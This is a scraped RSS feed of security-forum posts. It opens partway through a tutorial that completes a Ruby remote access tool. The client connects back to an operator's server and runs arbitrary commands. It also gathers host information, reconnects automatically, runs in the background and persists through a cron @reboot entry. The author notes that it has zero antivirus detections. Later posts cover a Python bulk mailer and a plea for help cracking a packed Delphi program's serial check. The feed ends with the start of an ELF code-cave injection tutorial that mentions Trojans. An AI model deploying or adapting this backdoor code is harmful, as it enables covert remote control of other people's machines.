<p>We use <code>require_relative "helpers.rb"</code> to bring the <code>Helpers</code> module into <code>client.rb</code>. We’re also bringing in <code>socket</code> and <code>etc</code> as they were in <code>helpers.rb</code>, similarly to how C++ header files work.</p>
<pre><code class="lang-auto">#!/usr/bin/env ruby

require_relative "helpers.rb"
</code></pre>
<p>We will have 2 methods in <code>client.rb</code>, <code>handle_client</code> and <code>main</code>. Once a client has been created and passed to <code>handle_client</code> we enter a <code>loop do...end</code> that listens for server commands with <code>data = client.recv(1024)</code>.</p>
<p>1024 is the max number of bytes the client can read from the server in a single message, if you expect your server could be sending larger messages set a larger number.</p>
<p>Once we’ve received the servers command, we use a <code>case...end</code> to call the correct <code>Helpers</code> method, execute it and hold the output in <code>result</code>.</p>
<p>If you recall from the Server <code>client_recv</code> checked the length of the message being sent and then read in that length in bytes. This works because we send <code>client.puts(result.length)</code>  directly before we write the actual message with <code>client.write(result)</code> in <code>handle_client</code>.</p>
<pre><code class="lang-auto">def handle_client(client)
  loop do
    result = ''
    data = client.recv(1024)
    next if data.nil?
    cmd, action = data.split ' '

    case cmd
    when 'heartbeat'
      result = 'alive'
    when 'exe'
      result = Helpers.exe(data.gsub('exe ', ''))
    when 'ls'
      result = Helpers.ls
    when 'pwd'
      result = Helpers.pwd
    when 'pid'
      result = Helpers.pid
    when 'ifconfig'
      result = Helpers.ifconfig
    when 'system'
      result = Helpers.system
    when 'destroy'
      return 42
    end

    result = result.to_s
    client.puts(result.length)
    client.write(result)
  end
end
</code></pre>
<p>We don’t have any error handling in <code>handle_client</code> because we intend for errors to come back out to <code>main</code> and get caught there.</p>
<p>When <code>main</code> is first called, we enter the first <code>loop do...end</code>. Here <code>client = nil</code> will reset the old client if it existed from previous iterations. We then attempt to create a new <code>TCPSocket</code> object called <code>client</code>.</p>
<p>At this point if the Server is down an <code>EAFNOSUPPORT</code> error will occur as the socket port is not available for the client. Without the <code>begin...rescue Exception...end</code> blocks our client would crash. Instead we print the error, then <code>sleep(timeout)</code> pausing the programs execution for timeout in seconds.</p>
<p>Once the program’s execution begins again, it will move through the entire <code>loop do...end</code> and reach <code>TCPSocket.new</code> again. This will continue indefinitely until the Server is up and there is no Exception to <code>rescue</code>.</p>
<pre><code class="lang-auto">def main(host, port, timeout)
  # Main loop to repeatedly attempt server connection
  loop do
    client = nil
    begin
      client = TCPSocket.new(host, port)
    rescue Exception =&gt; e
      puts e.message
      puts e.backtrace
      sleep(timeout)
    end

    exit_code = 0
    begin
      exit_code = handle_client(client)
    rescue Interrupt
      exit 0
    rescue Exception =&gt; e
      puts e.message
      puts e.backtrace
    end

  exit 0 if exit_code == 42
  end
end
</code></pre>
<p>I choose to use 42 as a signal to fully <code>exit 0</code> the client. Any number/string could be used for the <code>exit_code</code>.</p>
<p>You might be wondering why we don’t <code>exit 0</code> directly from <code>handle_client</code> when we receive the <code>'destroy'</code> message. This is due to the error handling of <code>rescue Exception</code> catching <em>all exceptions</em> and even <code>exit</code> is considered an exception.</p>
<p>We finish our RAT by setting optional command-line arguments for <code>client.rb</code> and calling <code>main</code>.</p>
<pre><code class="lang-auto">host = ARGV[0]
port = ARGV[1]

# If host/port is not passed in ARGV, default to localhost:3200
host ||= "localhost"
port ||= 3200
timeout = 2

main(host, port, timeout)
</code></pre>
<h3>Conclusion</h3>
<p>We can now launch clients with <code>./client.rb localhost 4000</code>. If a server was listening on locahost:4000 the text <code>New Connection: ID: 1 IP: 127.0.0.1</code> should appear in your server terminal.</p>
<p>So lets say you’ve got a server running on port 4000, you get the LAN IP of the server machine using <code>ifconfig</code> or <code>ip addr</code>, and its <code>192.168.1.8</code>. Now if you  have a spare laptop or virtual machine copy <code>client.rb</code> and <code>helpers.rb</code> to it. Run <code>./client.rb 192.168.1.8 4000</code>, if all went well, you’ll have a new connection <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>To run <code>client.rb</code> in the background, you can use <code>nohup ruby client.rb &amp;</code>.</p>
<p>Setting <code>client.rb</code> to run on startup is very possible, but will be different depending on the target distro. One approach for systems using <a href="https://en.wikipedia.org/wiki/Cron" rel="noopener nofollow ugc">cron</a> is <code>crontab -e</code> and adding <code>@reboot /path/to/client.rb</code>. Maybe in your version <code>client.rb</code> could automatically add itself to startup.</p>
<p>As expected from Ruby scripts without any malicious functionality like keylogging, <code>client.rb</code>, <code>helpers.rb</code> and <code>server.rb</code> have 0 detections from virustotal.</p>
<p><a href="https://www.virustotal.com/gui/file/a18cdebfa39c73f0bd487742610937a317e1c7ec02f362dbe3887be11688ffdc/detection" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/a18cdebfa39c73f0bd487742610937a317e1c7ec02f362dbe3887be11688ffdc/detection</a></p>
<p><a href="https://www.virustotal.com/gui/file/4bcf6300d01533e49085c82282e029d82848bd46b3a48909730c1303c2e4c29b/detection" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/4bcf6300d01533e49085c82282e029d82848bd46b3a48909730c1303c2e4c29b/detection</a></p>
<p><a href="https://www.virustotal.com/gui/file/0d107e5e74bbd130fdad17fa495dfa73978550457aca469048840b6d0d5ae8be/detection" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/0d107e5e74bbd130fdad17fa495dfa73978550457aca469048840b6d0d5ae8be/detection</a></p>
<p>Thank you for reading! Let me know of any improvements or suggestions.</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/how-to-build-your-own-ruby-rat/24919">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/how-to-build-your-own-ruby-rat/24919</link>
          <pubDate>Tue, 16 Feb 2021 19:34:16 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-24919</guid>
          <source url="https://d.clarkee.co.uk/t/how-to-build-your-own-ruby-rat/24919.rss">How-to Build Your Own Ruby RAT</source>
        </item>
        <item>
          <title>Python Email Automation</title>
          <dc:creator><![CDATA[chr0]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hi everyone, hope you’re all having a good day. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>You’ve probably created many programs which output interesting files and text. Lets use Python to mass mail these outputs to as many people as we want, as many times as we want, without having to manually fill out 100s of emails.</p>
<p>We can accomplish this using <code>smtplib</code> from the standard python library. Which uses <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol" rel="noopener nofollow ugc">Simple Mail Transfer Protocol</a> aka SMTP.</p>
<p>Code availabe at <a href="https://github.com/chr0x6d/python_mail" rel="noopener nofollow ugc">https://github.com/chr0x6d/python_mail</a></p>
<h3>What you'll need</h3>
<ul>
<li>Python 3.7+</li>
<li>An email account which supports SMTP (Gmail and Outlook work fine)</li>
<li>List of email recipients</li>
</ul>
<h3>Notes</h3>
<ul>
<li>I am far from an expert programmer, all criticism is welcome!</li>
<li>This program is not secure in its current state, passwords are stored in plain-text. This is for simplicity, adapt the program to your own needs.
</li>
</ul>
<hr>
<h3>Setup</h3>
<p>Create a new python file called <code>client.py</code> and lets start with adding in all the imports we’ll need. We’ll discuss these later.</p>
<pre><code class="lang-auto">import smtplib
from email.mime.multipart import MIMEMultipart # Creating email messages
from email.mime.text import MIMEText           # Creating email body text
from email.utils import formataddr             # Formatting email headers
from email.mime.base import MIMEBase           # Handling email attachments
from email import encoders                     # Encoding email attachments

import config
</code></pre>
<p>Create a new file called <code>config.py</code>, this is to simplify using the program, instead of wading through lots of code to change simple things like the recipient list we only have to edit <code>config.py</code>.</p>
<p>I will be using Gmail but feel free to use any email provider. Ensure <code>config.py</code> is in the same directory as <code>client.py</code> and add the following with your own details:</p>
<pre><code class="lang-auto">smtp_addr = 'smtp.gmail.com'      # Gmails SMTP server
smtp_port = 587                   # SMTP supported port for Gmail

attachments = [                   # Locations of Attachments, relative or full path, leave as empty [] for no attachments
    'important.pdf', 
    'cat.png',
    '/opt/opt_cat.jpeg',
]

which_sender_to_use = 0           # Leave at 0 to use the first sender in dictionary
senders = {
    'user@gmail.com':'PASSWORD',  # Your actual email and password from provider
    'user1@gmail.com':'PASSWORD', # This is not particularly secure, consider using a throw-away account or encryption
}

receivers = {                     # The List of recipients, mail will go to each.
    'user@protonmail.com':'User', # &lt;receiver_email&gt;:&lt;receiver_actual_name(Optional - leave as "" for no-name)&gt;
    'john@gmail.com':'John Smith',
    'sparrow1828@outlook.com':'Captain Jack Sparrow',
}
</code></pre>
<p>We use port 587 for Gmail SMTP which allows us to start a plain text conversation then enable TLS afterwards.<br>
That’s it for the setup, now we can jump into starting our SMTP client.</p>
<h3>Using SMTP</h3>
<p>Now that we have a base to work with, lets go back to <code>client.py</code>.</p>
<pre><code class="lang-auto">smtp_client = smtplib.SMTP(config.smtp_addr, config.smtp_port)
# smtp_client.set_debuglevel(True) # Uncomment for verbose logging in console

smtp_client.ehlo() # Extended Hello to SMTP server, client identifies itself to initiate conversation
smtp_client.starttls() # The connection now uses TLS encryption
smtp_client.ehlo() # We introduce ourselves to the server again under TLS

# Grab our username and password from config.py
username = list(config.senders.keys())[config.which_sender_to_use]
password = config.senders[username]

smtp_client.login(username, password) # Attempt to login to our email account
</code></pre>
<p>If all went well we will now be logged in to our email account under TLS encryption. If you get an Authentication error and are using Gmail, ensure you have enabled <a href="https://support.google.com/accounts/answer/6010255?hl=en" rel="noopener nofollow ugc">Less Secure Apps</a>. Google classes all login attempts from not within a browser as insecure and blocks them by default.</p>
<h3>Creating email messages</h3>
<p>We are now able to send emails using SMTP. This is not much use without being able to form sensible email messages complete with subjects, attachments and text. Lets write a message creating function in <code>client.py</code>.</p>
<pre><code class="lang-auto">def makeEmailMessage(receiver_name, receiver, subject, attachments=None, extra=''):
    # Make body using f-string, extra is an optional parameter to include text in body.
    body = f"""Hi {receiver_name},

{extra}"""
    msg = MIMEMultipart() # Use MIME standard for email formatting
    msg['From'] = username # Email address used for login
    msg['To'] = formataddr((receiver_name, receiver)) # Actual name of receiver will show instead of email address
    msg['Subject'] = subject
    body = MIMEText(body)
    msg.attach(body) # This does not "attach" the body text as a file, it is added to the text content of email 

    # Handle case of 0 attachments
    if attachments is None:
        attachments = []

    # Every file in attachments will be added to msg using standard email encoding
    # The files local name will be used to name it
    for file in attachments:
        attach_file = open(file, 'rb') # open in binary mode
        email_file = MIMEBase('application', 'octate-stream')
        email_file.set_payload((attach_file).read())
        encoders.encode_base64(email_file)

        email_file.add_header('Content-Disposition', 'attachment', filename=file)
        msg.attach(email_file) # The processed file is now added to the email

    return msg
</code></pre>
<h3>Mass Mailing</h3>
<p>Now we can start spamming emails and annoying everyone in our receivers dictionary from <code>config.py</code>. I’m going to use a for loop in this example. If I was sending a static email with the same content in each email I would not use a loop, instead using a receivers list and sending all the mail at once like <a href="https://stackoverflow.com/questions/8856117/how-to-send-email-to-multiple-recipients-using-python-smtplib" rel="noopener nofollow ugc">in this stack overflow answer</a>.</p>
<p>So, continuing on in <code>client.py</code>:</p>
<pre><code class="lang-auto">def genNuclearLaunchCodes(n): # Example of function which isn't purely static
    return ("6E 75 6B 65 21" * n)

iteration = 1
for receiver in config.receivers:
    msg = makeEmailMessage(config.receivers[receiver], receiver, 'SUBJECT HERE', config.attachments, genNuclearLaunchCodes(iteration))
    smtp_client.send_message(msg, username, receiver) # The email will be sent through the SMTP account we've logged into
    print(f'{iteration}: email sent to {receiver} from {username}')
    iteration += 1
</code></pre>
<p>Add the correct data into <code>config.py</code> then we can run <code>client.py</code> and our mail will be sent.</p>
<p>That’s the simple python mailer finished, thanks for reading.</p>
            <p><small>6 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/python-email-automation/23842">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/python-email-automation/23842</link>
          <pubDate>Tue, 10 Nov 2020 15:50:48 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23842</guid>
          <source url="https://d.clarkee.co.uk/t/python-email-automation/23842.rss">Python Email Automation</source>
        </item>
        <item>
          <title>Help with Self-modifying code unpacker</title>
          <dc:creator><![CDATA[0xcore]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello everyone,</p>
<p>Please, i need help for delphi self-modifying code.<br>
Serial Registration part listed below:</p>
<p>umain::Tfmain.RzBitBtn3Click<br>
00641AF4    push       ebp<br>
00641AF5    mov        ebp,esp<br>
00641AF7    mov        ecx,0B<br>
00641AFC    push       0<br>
00641AFE    push       0<br>
00641B00    dec        ecx<br>
&lt;00641B01    jne        00641AFC<br>
00641B03    push       ecx<br>
00641B04    push       ebx<br>
00641B05    push       esi<br>
00641B06    push       edi<br>
00641B07    mov        dword ptr [ebp-4],eax<br>
00641B0A    xor        eax,eax<br>
00641B0C    push       ebp<br>
00641B0D    push       641EBB<br>
00641B12    push       dword ptr fs:[eax]<br>
00641B15    mov        dword ptr fs:[eax],esp<br>
00641B18    lea        edx,[ebp-8]<br>
00641B1B    mov        eax,dword ptr [ebp-4]<br>
00641B1E    mov        eax,dword ptr [eax+388]; Tfmain.cx29100:TRzEdit<br>
00641B24    call       TRzEdit.GetText<br>
00641B29    cmp        dword ptr [ebp-8],0</p>
<blockquote>
<p>00641B2D    jne        00641B6B<br>
00641B2F    lea        edx,[ebp-0C]<br>
00641B32    mov        eax,dword ptr [ebp-4]<br>
00641B35    mov        eax,dword ptr [eax+38C]; Tfmain.kp39299:TRzEdit<br>
00641B3B    call       TRzEdit.GetText<br>
00641B40    cmp        dword ptr [ebp-0C],0<br>
00641B44    jne        00641B6B<br>
00641B46    push       0<br>
00641B48    lea        edx,[ebp-10]<br>
00641B4B    mov        eax,641ED4; ‘656D70747920656D61696C20616E642073657269616C2072656769737465726564’<br>
00641B50    call       0063F858<br>
00641B55    mov        eax,dword ptr [ebp-10]<br>
00641B58    mov        cx,word ptr ds:[641F18]; 0x4<br>
00641B5F    mov        dl,2<br>
00641B61    call       MessageDlg<br>
00641B66    jmp        00641E56<br>
00641B6B    mov        eax,dword ptr [ebp-4]<br>
00641B6E    mov        eax,dword ptr [eax+32C]; Tfmain.IdHTTP1:TIdHTTP<br>
00641B74    mov        edx,641F24; ‘<a href="http://google.com" rel="noopener nofollow ugc">google.com</a>’<br>
00641B79    mov        ecx,dword ptr [eax]<br>
00641B7B    call       dword ptr [ecx+88]; TIdCustomHTTP.SetHost<br>
00641B81    mov        eax,dword ptr [ebp-4]<br>
00641B84    mov        ebx,dword ptr [eax+32C]; Tfmain.IdHTTP1:TIdHTTP<br>
00641B8A    cmp        dword ptr [ebx+0C8],0; TIdHTTP.Host:String<br>
00641B91    je         00641E56<br>
00641B97    xor        eax,eax<br>
00641B99    push       ebp<br>
00641B9A    push       641E2C<br>
00641B9F    push       dword ptr fs:[eax]<br>
00641BA2    mov        dword ptr fs:[eax],esp<br>
00641BA5    mov        eax,ebx<br>
00641BA7    mov        edx,dword ptr [eax]<br>
00641BA9    call       dword ptr [edx+58]; TIdTCPConnection.Disconnect<br>
00641BAC    mov        eax,dword ptr [ebp-4]<br>
00641BAF    mov        eax,dword ptr [eax+32C]; Tfmain.IdHTTP1:TIdHTTP<br>
00641BB5    or         edx,0FFFFFFFF<br>
00641BB8    mov        ecx,dword ptr [eax]<br>
00641BBA    call       dword ptr [ecx+94]; TIdTCPClient.Connect<br>
00641BC0    mov        eax,dword ptr [ebp-4]<br>
00641BC3    mov        eax,dword ptr [eax+32C]; Tfmain.IdHTTP1:TIdHTTP<br>
00641BC9    mov        edx,dword ptr [eax]<br>
00641BCB    call       dword ptr [edx+54]; TIdTCPConnection.Connected<br>
00641BCE    test       al,al<br>
00641BD0    je         00641E22<br>
00641BD6    xor        eax,eax<br>
00641BD8    push       ebp<br>
00641BD9    push       641D2D<br>
00641BDE    push       dword ptr fs:[eax]<br>
00641BE1    mov        dword ptr fs:[eax],esp<br>
00641BE4    mov        eax,dword ptr [ebp-4]<br>
00641BE7    mov        ebx,dword ptr [eax+3A8]; Tfmain.ZSQL:TMyQuery<br>
00641BED    mov        eax,ebx<br>
00641BEF    call       TDataSet.Close<br>
00641BF4    mov        eax,ebx<br>
00641BF6    call       TMyQuery.GetSQL<br>
00641BFB    mov        edx,dword ptr [eax]<br>
00641BFD    call       dword ptr [edx+44]; TStringList.Clear<br>
00641C00    mov        eax,ebx<br>
00641C02    call       TMyQuery.GetSQL<br>
00641C07    mov        edx,641F38; ‘SELECT * FROM tb_thedon where id_software=:id_soft and email_reg=:em_reg’<br>
00641C0C    mov        ecx,dword ptr [eax]<br>
00641C0E    call       dword ptr [ecx+2C]; TStrings.SetTextStr<br>
00641C11    mov        edx,641F8C; ‘id_soft’<br>
00641C16    mov        eax,ebx<br>
00641C18    call       005E2CF8<br>
00641C1D    push       eax<br>
00641C1E    lea        eax,[ebp-20]<br>
00641C21    mov        edx,641F9C; ‘donpm12’<br>
00641C26    call       <span class="mention">@VarFromLStr</span><br>
00641C2B    lea        edx,[ebp-20]<br>
00641C2E    pop        eax<br>
00641C2F    mov        ecx,dword ptr [eax]<br>
00641C31    call       dword ptr [ecx+98]<br>
00641C37    lea        edx,[ebp-34]<br>
00641C3A    mov        eax,dword ptr [ebp-4]<br>
00641C3D    mov        eax,dword ptr [eax+388]; Tfmain.cx29100:TRzEdit<br>
00641C43    call       TRzEdit.GetText<br>
00641C48    mov        edx,dword ptr [ebp-34]<br>
00641C4B    lea        eax,[ebp-30]<br>
00641C4E    call       <span class="mention">@VarFromLStr</span><br>
00641C53    lea        eax,[ebp-30]<br>
00641C56    push       eax<br>
00641C57    mov        edx,641FAC; ‘em_reg’<br>
00641C5C    mov        eax,ebx<br>
00641C5E    call       005E2CF8<br>
00641C63    pop        edx<br>
00641C64    mov        ecx,dword ptr [eax]<br>
00641C66    call       dword ptr [ecx+98]<br>
00641C6C    mov        eax,ebx<br>
00641C6E    call       TDataSet.Open<br>
00641C73    mov        edx,641FBC; ‘email_reg’<br>
00641C78    mov        eax,ebx<br>
00641C7A    call       TDataSet.FieldByName<br>
00641C7F    lea        edx,[ebp-38]<br>
00641C82    mov        ecx,dword ptr [eax]<br>
00641C84    call       dword ptr [ecx+60]; TField.GetAsString<br>
00641C87    mov        edx,dword ptr [ebp-38]<br>
00641C8A    mov        eax,651620<br>
00641C8F    call       <span class="mention">@LStrAsg</span><br>
00641C94    mov        edx,641FD0; ‘serial’<br>
00641C99    mov        eax,ebx<br>
00641C9B    call       TDataSet.FieldByName<br>
00641CA0    lea        edx,[ebp-40]<br>
00641CA3    mov        ecx,dword ptr [eax]<br>
00641CA5    call       dword ptr [ecx+60]; TField.GetAsString<br>
00641CA8    mov        eax,dword ptr [ebp-40]<br>
00641CAB    lea        edx,[ebp-3C]<br>
00641CAE    call       0063F470<br>
00641CB3    mov        edx,dword ptr [ebp-3C]<br>
00641CB6    mov        eax,651624<br>
00641CBB    call       <span class="mention">@LStrAsg</span><br>
00641CC0    mov        edx,641FE0; ‘status’<br>
00641CC5    mov        eax,ebx<br>
00641CC7    call       TDataSet.FieldByName<br>
00641CCC    lea        edx,[ebp-44]<br>
00641CCF    mov        ecx,dword ptr [eax]<br>
00641CD1    call       dword ptr [ecx+60]; TField.GetAsString<br>
00641CD4    mov        edx,dword ptr [ebp-44]<br>
00641CD7    mov        eax,651628<br>
00641CDC    call       <span class="mention">@LStrAsg</span><br>
00641CE1    mov        edx,641FF0; ‘status_msg’<br>
00641CE6    mov        eax,ebx<br>
00641CE8    call       TDataSet.FieldByName<br>
00641CED    lea        edx,[ebp-48]<br>
00641CF0    mov        ecx,dword ptr [eax]<br>
00641CF2    call       dword ptr [ecx+60]; TField.GetAsString<br>
00641CF5    mov        edx,dword ptr [ebp-48]<br>
00641CF8    mov        eax,65162C<br>
00641CFD    call       <span class="mention">@LStrAsg</span><br>
00641D02    mov        edx,642004; ‘message’<br>
00641D07    mov        eax,ebx<br>
00641D09    call       TDataSet.FieldByName<br>
00641D0E    lea        edx,[ebp-4C]<br>
00641D11    mov        ecx,dword ptr [eax]<br>
00641D13    call       dword ptr [ecx+60]; TField.GetAsString<br>
00641D16    mov        edx,dword ptr [ebp-4C]<br>
00641D19    mov        eax,651630<br>
00641D1E    call       <span class="mention">@LStrAsg</span><br>
00641D23    xor        eax,eax<br>
00641D25    pop        edx<br>
00641D26    pop        ecx<br>
00641D27    pop        ecx<br>
00641D28    mov        dword ptr fs:[eax],edx<br>
00641D2B    jmp        00641D37<br>
&lt;00641D2D    jmp        <span class="mention">@HandleAnyException</span><br>
00641D32    call       <span class="mention">@DoneExcept</span><br>
00641D37    mov        eax,[0065162C]; 0x0<br>
00641D3C    mov        edx,642014; ‘information’<br>
00641D41    call       <span class="mention">@LStrCmp</span><br>
00641D46    jne        00641D4C<br>
00641D48    mov        bl,2<br>
00641D4A    jmp        00641D78<br>
00641D4C    mov        eax,[0065162C]; 0x0<br>
00641D51    mov        edx,642028; ‘error’<br>
00641D56    call       <span class="mention">@LStrCmp</span><br>
00641D5B    jne        00641D61<br>
00641D5D    mov        bl,1<br>
00641D5F    jmp        00641D78<br>
00641D61    mov        eax,[0065162C]; 0x0<br>
00641D66    mov        edx,642038; ‘warning’<br>
00641D6B    call       <span class="mention">@LStrCmp</span><br>
00641D70    jne        00641D76<br>
00641D72    xor        ebx,ebx<br>
00641D74    jmp        00641D78<br>
00641D76    mov        bl,1<br>
00641D78    lea        edx,[ebp-50]<br>
00641D7B    mov        eax,dword ptr [ebp-4]<br>
00641D7E    mov        eax,dword ptr [eax+388]; Tfmain.cx29100:TRzEdit<br>
00641D84    call       TRzEdit.GetText<br>
00641D89    mov        eax,dword ptr [ebp-50]<br>
00641D8C    mov        edx,dword ptr ds:[651620]; 0x0<br>
00641D92    call       <span class="mention">@LStrCmp</span><br>
00641D97    jne        00641E02<br>
00641D99    lea        edx,[ebp-54]<br>
00641D9C    mov        eax,dword ptr [ebp-4]<br>
00641D9F    mov        eax,dword ptr [eax+38C]; Tfmain.kp39299:TRzEdit<br>
00641DA5    call       TRzEdit.GetText<br>
00641DAA    mov        eax,dword ptr [ebp-54]<br>
00641DAD    mov        edx,dword ptr ds:[651624]; 0x0<br>
00641DB3    call       <span class="mention">@LStrCmp</span><br>
00641DB8    jne        00641E02<br>
00641DBA    mov        eax,[00651628]; 0x0<br>
00641DBF    mov        edx,642048; ‘1’<br>
00641DC4    call       <span class="mention">@LStrCmp</span><br>
00641DC9    jne        00641E02<br>
00641DCB    push       0<br>
00641DCD    mov        cx,word ptr ds:[641F18]; 0x4<br>
00641DD4    mov        edx,ebx<br>
00641DD6    mov        eax,[00651630]; 0x0<br>
00641DDB    call       MessageDlg<br>
00641DE0    mov        eax,dword ptr [ebp-4]<br>
00641DE3    mov        eax,dword ptr [eax+388]; Tfmain.cx29100:TRzEdit<br>
00641DE9    xor        edx,edx<br>
00641DEB    call       TRzEdit.SetText<br>
00641DF0    mov        eax,dword ptr [ebp-4]<br>
00641DF3    mov        eax,dword ptr [eax+38C]; Tfmain.kp39299:TRzEdit<br>
00641DF9    xor        edx,edx<br>
00641DFB    call       TRzEdit.SetText<br>
00641E00    jmp        00641E22<br>
00641E02    push       0<br>
00641E04    lea        edx,[ebp-58]<br>
00641E07    mov        eax,642054; ‘696E76616C696420656D61696C207265676973746572656420616E642073657269616C206C6963656E7365’<br>
00641E0C    call       0063F858<br>
00641E11    mov        eax,dword ptr [ebp-58]<br>
00641E14    mov        cx,word ptr ds:[641F18]; 0x4<br>
00641E1B    mov        dl,1<br>
00641E1D    call       MessageDlg<br>
00641E22    xor        eax,eax<br>
00641E24    pop        edx<br>
00641E25    pop        ecx<br>
00641E26    pop        ecx<br>
00641E27    mov        dword ptr fs:[eax],edx<br>
00641E2A    jmp        00641E56<br>
&lt;00641E2C    jmp        <span class="mention">@HandleAnyException</span><br>
00641E31    push       0<br>
00641E33    lea        edx,[ebp-5C]<br>
00641E36    mov        eax,6420B4; ‘6E6F7420636F6E6E656374656420746F207265676973746572207365727665722E20506C656173652072652D436865636B20596F757220496E7465726E657420436F6E6E656374696F6E’<br>
00641E3B    call       0063F858<br>
00641E40    mov        eax,dword ptr [ebp-5C]<br>
00641E43    mov        cx,word ptr ds:[641F18]; 0x4<br>
00641E4A    mov        dl,1<br>
00641E4C    call       MessageDlg<br>
00641E51    call       <span class="mention">@DoneExcept</span><br>
00641E56    xor        eax,eax<br>
00641E58    pop        edx<br>
00641E59    pop        ecx<br>
00641E5A    pop        ecx<br>
00641E5B    mov        dword ptr fs:[eax],edx<br>
00641E5E    push       641EC2<br>
00641E63    lea        eax,[ebp-5C]<br>
00641E66    mov        edx,2<br>
00641E6B    call       <span class="mention">@LStrArrayClr</span><br>
00641E70    lea        eax,[ebp-54]<br>
00641E73    mov        edx,2<br>
00641E78    call       <span class="mention">@LStrArrayClr</span><br>
00641E7D    lea        eax,[ebp-4C]<br>
00641E80    mov        edx,6<br>
00641E85    call       <span class="mention">@LStrArrayClr</span><br>
00641E8A    lea        eax,[ebp-34]<br>
00641E8D    call       <span class="mention">@LStrClr</span><br>
00641E92    lea        eax,[ebp-30]<br>
00641E95    mov        edx,dword ptr ds:[401144]; Variant<br>
00641E9B    mov        ecx,2<br>
00641EA0    call       <span class="mention">@FinalizeArray</span><br>
00641EA5    lea        eax,[ebp-10]<br>
00641EA8    call       <span class="mention">@LStrClr</span><br>
00641EAD    lea        eax,[ebp-0C]<br>
00641EB0    mov        edx,2<br>
00641EB5    call       <span class="mention">@LStrArrayClr</span><br>
00641EBA    ret<br>
&lt;00641EBB    jmp        <span class="mention">@HandleFinally</span><br>
&lt;00641EC0    jmp        00641E63<br>
00641EC2    pop        edi<br>
00641EC3    pop        esi<br>
00641EC4    pop        ebx<br>
00641EC5    mov        esp,ebp<br>
00641EC7    pop        ebp<br>
00641EC8    ret</p>
</blockquote>
<p>Protection: Yoda Crypter</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/help-with-self-modifying-code-unpacker/23351">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/help-with-self-modifying-code-unpacker/23351</link>
          <pubDate>Wed, 30 Sep 2020 17:30:13 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23351</guid>
          <source url="https://d.clarkee.co.uk/t/help-with-self-modifying-code-unpacker/23351.rss">Help with Self-modifying code unpacker</source>
        </item>
        <item>
          <title>Hide Encrypted Files inside unsuspecting Binaries</title>
          <dc:creator><![CDATA[digitalXmage]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p><strong>Hiding Encrypted Files within unsuspecting Binaries</strong></p>
<p>This is pretty basic stuff if you’re are familiar with the ELF binary format as well as basic experience with creating your own basic Trojans with Elf binary injection. However With a bit of creativity I have found other ways to use Elf binaries, not just for malicious intent for creating Trojan Horses, but also to hide sensitive data within unsuspecting binary files.</p>
<p>The whole point of this post is to spark creative ideas in others. And also give back to the community, that has given me a lot in return.</p>
<p><strong>Use case</strong></p>
<p>Lets say You have some encrypted files in a directory. Well It’s good that’s it’s encrypted and I hope you’ve hidden your private key well! However As an extra level of security, How about hiding those encrypted files inside unsuspecting binary programs? So to any Hacker, They look like regular binary files, and they execute them as expected ,because they are normal executable <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> . However Inside the executable is a secret encrypted file embedded into the binary of the file.</p>
<p>It reminds me of how Mr robot hides encrypted files within CD’s</p>
<p><strong>The Code</strong></p>
<p><strong>The Structs Used</strong></p>
<pre><code>/*Used for pointing to the mapped binary in memory*/

struct Host
{
     uint8_t *host;
};

/*used as a guide to where the secret file is located in the binary,
* this will be embedded into the .NOTE section for easy reference*/

struct secret_map
{

    Elf64_Addr offset;
    int64_t size;

};
</code></pre>
<p><strong>Writing An Encrypted File into Binary The Algorithm</strong></p>
<ol>
<li>
<p>Read the Encrypted File from the user onto the Heap. Then Find an available Code cave (unused space) big enough for the File, and Write the File to the unused space. Then save the coordinates to the Struct Secret_map (our roadmap).</p>
<pre><code>void write_secret_file()
{
   Elf64_Ehdr *ehdr; Elf64_Phdr *phdr;

 ehdr = (Elf64_Ehdr *)host.host;
 phdr = (Elf64_Phdr *)&amp;host.host[ehdr-&gt;e_phoff];


 /*open key file and mmap to heap*/
 int fd = open(sfile,O_RDONLY);

 struct stat st;
 lstat(sfile,&amp;st);

 char *secret_file = malloc(sizeof(char)*st.st_size);

 /*read file into allocated memory*/
 read(fd,secret_file,st.st_size);


 int cave_offset,cave_length; cave_offset = cave_length = 0;
 for(int i=0;i&lt;ehdr-&gt;e_phnum;i++)
 {
 	/*calculate start*/
 	cave_offset = phdr[i].p_offset + phdr[i].p_filesz;
 	/*next calculate the gap*/
 	cave_length = phdr[i+1].p_offset - cave_offset;

 	if(cave_length&gt;=st.st_size)
 	{
 		printf("[+]Found cave to fit secret file\n");
 		printf("cave offset = %d and length = %d\n",cave_offset,cave_length);


 		/*memcpy secret_file into code cave*/
 		memcpy((host.host+cave_offset),secret_file,st.st_size);
 		printf("[+]Secret file injected into binary\n");

